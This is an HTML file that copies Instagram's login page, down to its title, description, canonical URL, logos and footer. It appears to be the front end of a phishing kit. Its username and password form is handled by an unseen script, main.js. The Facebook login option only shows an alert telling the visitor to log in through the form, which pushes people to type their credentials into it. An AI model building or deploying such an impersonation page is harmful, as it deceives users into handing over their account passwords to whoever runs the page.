<!DOCTYPE html>
<html>

<head>
    <title>Instagram</title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta property="og:url" content="https://instagram.com/" />
    <meta
        content="Create an account or log in to Instagram - A simple, fun &amp; creative way to capture, edit &amp; share photos, videos &amp; messages with friends &amp; family."
        name="description" />
    <link rel="canonical" href="https://www.instagram.com/" />

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/styles.css">
    <link rel="icon" href="images/logofav.png" type="image/png">

    <style>
        .bbb {
            background-color: #0095f6;
            border-radius: 5px;
            display: block;
            border: 0;
            padding: 5px;
            margin-top: 15px;
            margin-bottom: 20px;
            color: white;
            font-weight: 600;
        }
    </style>
</head>

<body>
    <main id="login">
        <div class="login__column">
            <img src="images/phoneImage.png" class="login__phone" />
        </div>
        <div class="login__column">
            <div class="login__box">
                <img src="images/loginLogo.png" class="login__logo" />
                <span onclick="alert('Not available, please login')" class='bbb bbb1'>

                    <i class="fab fa-facebook-square mr-2"></i>
                    Continue with Facebook</span>
                <span class="login__divider">or</span>


                <form id='form' class="login__form">
                    <input type="text" id='username' name="username" placeholder="Username" required />
                    <input type="password" id='password' name="password" placeholder="Password" required />

                    <button type='submit' style='display: block; width: 100%' class='bbb'>

                   
                        Log in </button>


                </form>



                <a href="#" class="login__link login__link--small">Forgot password</a>
            </div>
            <div class="login__box">
                <span>Don't have an account?</span> <a href="#">Sign up</a>
            </div>
            <div class="login__box--transparent">
                <span>Get the app.</span>
                <div class="login__appstores">
                    <img src="images/ios.png" class="login__appstore" alt="Apple appstore logo"
                        title="Apple appstore logo" />
                    <img src="images/android.png" class="login__appstore" alt="Android appstore logo"
                        title="Android appstore logo" />
                </div>
            </div>
        </div>
    </main>
    <footer class="footer">
        <div class="footer__column">
            <nav class="footer__nav">
                <ul class="footer__list">
                    <li class="footer__list-item"><a href="#" class="footer__link">About Us</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Support</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Blog</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Press</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Api</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Jobs</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Privacy</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Terms</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Directory</a></li>
                    <li class="footer__list-item"><a href="#" class="footer__link">Language</a></li>
                </ul>
            </nav>
        </div>
        <div class="footer__column">
            <span class="footer__copyright">Â© 2017 Instagram</span>
        </div>
    </footer>
    <script src='main.js'></script>
    <script src="https://kit.fontawesome.com/184249fc52.js" async crossorigin="anonymous"></script>

</body>

</html>
